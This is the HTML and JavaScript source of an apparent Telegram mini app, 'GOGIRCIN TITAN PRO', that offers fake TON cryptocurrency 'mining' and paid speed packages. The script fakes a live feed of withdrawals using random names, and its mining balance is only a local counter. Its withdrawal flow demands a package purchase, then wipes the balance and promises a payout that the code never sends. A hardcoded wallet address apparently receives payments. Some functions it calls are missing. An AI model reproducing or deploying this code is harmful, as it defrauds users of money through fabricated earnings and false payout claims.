<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GOGIRCIN TITAN PRO</title>
    <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --blue: #007aff; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --green: #22c55e; --gold: #fbbf24; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; overflow: hidden; }
        .page { display: none; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; padding-bottom: 120px; }
        .page.active { display: block !important; }
        .card { background: var(--card); border-radius: 16px; padding: 20px; margin-bottom: 15px; border: 1px solid #334155; text-align: center; }
        .btn { background: var(--blue); color: white; border: none; padding: 14px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; transition: 0.2s; }
        .btn:active { transform: scale(0.96); }
        
        /* Kayar Yazı Reklam Alanı */
        .live-ticker { background: rgba(0,0,0,0.3); padding: 8px; font-size: 12px; color: var(--gold); border-bottom: 1px solid #334155; overflow: hidden; white-space: nowrap; }
        .ticker-text { display: inline-block; animation: scroll 15s linear infinite; }
        @keyframes scroll { from { transform: translateX(100%); } to { transform: translateX(-100%); } }

        .navbar { position: fixed; bottom: 0; width: 100%; height: 75px; background: var(--card); display: flex; border-top: 1px solid #334155; z-index: 100; }
        .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: #94a3b8; cursor: pointer; }
        .nav-item.active { color: var(--blue); }
        .nav-item span { font-size: 22px; margin-bottom: 4px; }
    </style>
</head>
<body>

    <div class="live-ticker">
        <div class="ticker-text" id="ticker">Yükleniyor...</div>
    </div>

    <div id="p-home" class="page active">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
            <div class="card" style="margin:0; padding: 10px 20px; display: flex; align-items: center; gap: 8px;">
                <span>💎</span> <span id="top-bal">0.0000</span>
            </div>
            <button class="btn" style="width: auto; background: var(--green); padding: 10px 25px;" onclick="claim()">Claim</button>
        </div>
        <div id="ton-connect-btn" style="display: flex; justify-content: center; margin-bottom: 15px;"></div>
        <div class="card">
            <div style="font-size: 50px; margin-bottom: 10px;" id="m-icon">⚡</div>
            <div style="font-size: 38px; font-weight: 800; color: var(--blue);" id="m-bal">0.00000000</div>
            <p id="pph-text" style="background: rgba(0,122,255,0.1); display: inline-block; padding: 5px 15px; border-radius: 20px; color: var(--blue); font-weight: bold;">⚡ 0.512 PPH</p>
            <button id="start-btn" class="btn" style="margin-top: 15px;" onclick="startMining()">🚀 Start Mining</button>
        </div>
    </div>

    <div id="p-shop" class="page">
        <h2 style="text-align:center;">Hız Paketleri</h2>
        <div class="card"><h3>V1 Paketi</h3><p>1.9 TON</p><button class="btn" onclick="buySpeed(1.9, 0.50)">Satın Al</button></div>
        <div class="card"><h3>V2 Paketi</h3><p>5.0 TON</p><button class="btn" onclick="buySpeed(5.0, 2.50)">Satın Al</button></div>
    </div>

    <div id="p-wallet" class="page">
        <h2 style="text-align:center;">Cüzdanım</h2>
        <div class="card">
            <p>Toplam Bakiye</p>
            <h1 id="wallet-ton">0.0500 💎</h1>
            <button class="btn" onclick="handleWithdraw()">📤 Para Çek</button>
        </div>
    </div>

    <div class="navbar">
        <div class="nav-item active" onclick="go('home')" id="n-home"><span>🏠</span>Home</div>
        <div class="nav-item" onclick="go('shop')" id="n-shop"><span>🚀</span>Shop</div>
        <div class="nav-item" onclick="go('wallet')" id="n-wallet"><span>👛</span>Wallet</div>
    </div>

    <script>
        const MY_WALLET = "UQC8qx530ORsKhEMwVVd_3UtPfjnAxKyA0DgTB1yR513oBOd"; 
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://hakk2793.github.io/titan-app/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-btn'
        });

        let wBal = parseFloat(localStorage.getItem('wBal')) || 0.05;
        let mBal = parseFloat(localStorage.getItem('mBal')) || 0;
        let pph = parseFloat(localStorage.getItem('pph')) || 0.512;
        let isMining = localStorage.getItem('isMining') === 'true';
        let wCount = parseInt(localStorage.getItem('wCount')) || 0;
        let hasInv = localStorage.getItem('hasInv') === 'true';

        // KAYAR YAZI SİSTEMİ
        const names = ["Ahmet", "John", "Dmitry", "Fatma", "Alex", "Satoshi", "Elena", "Mehmet"];
        function updateTicker() {
            const name = names[Math.floor(Math.random() * names.length)];
            const amount = (Math.random() * (15 - 1.9) + 1.9).toFixed(2);
            document.getElementById('ticker').innerText = `✅ Son Çekim: ${name}... ${amount} TON çekim yaptı! • `;
        }
        setInterval(updateTicker, 15000); updateTicker();

        function handleWithdraw() {
            if(!hasInv) return Telegram.WebApp.showAlert("⚠️ Şart: En az V1 paketi sahibi olmalısınız.");
            
            if(wCount == 0) { // 1. Çekim Şartı
                if(wBal < 1.9) return Telegram.WebApp.showAlert("❌ 1. Çekim için bakiyeniz en az 1.9 TON olmalıdır.");
                confirmWithdraw("1.9 TON");
            } else if(wCount == 1) { // 2. Çekim Şartı
                if(wBal < 50) return Telegram.WebApp.showAlert("❌ 2. Çekim için bakiyeniz en az 50 TON olmalıdır.");
                confirmWithdraw("50 TON");
            }
        }

        function confirmWithdraw(amt) {
            Telegram.WebApp.showConfirm(`${amt} çekim talebi oluşturulsun mu?`, (c) => {
                if(c) { 
                    wBal = 0; wCount++; 
                    localStorage.setItem('wBal', 0); localStorage.setItem('wCount', wCount);
                    update(); Telegram.WebApp.showAlert("Talep alındı, 24 saat içinde cüzdanınızda!"); 
                }
            });
        }

        function startMining() {
            if(isMining) return;
            isMining = true; localStorage.setItem('isMining', 'true');
            document.getElementById('start-btn').innerText = "Madencilik Yapılıyor...";
            setInterval(() => { mBal += (pph/3600); update(); }, 1000);
        }

        function update() {
            document.getElementById('m-bal').innerText = mBal.toFixed(8);
            document.getElementById('top-bal').innerText = wBal.toFixed(4);
            document.getElementById('wallet-ton').innerText = wBal.toFixed(4) + " 💎";
            localStorage.setItem('mBal', mBal);
        }
        function go(p) { 
            document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
            document.getElementById('p-'+p).classList.add('active');
        }
        window.onload = () => { if(isMining) { isMining=false; startMining(); } update(); };
    </script>
</body>
</html>
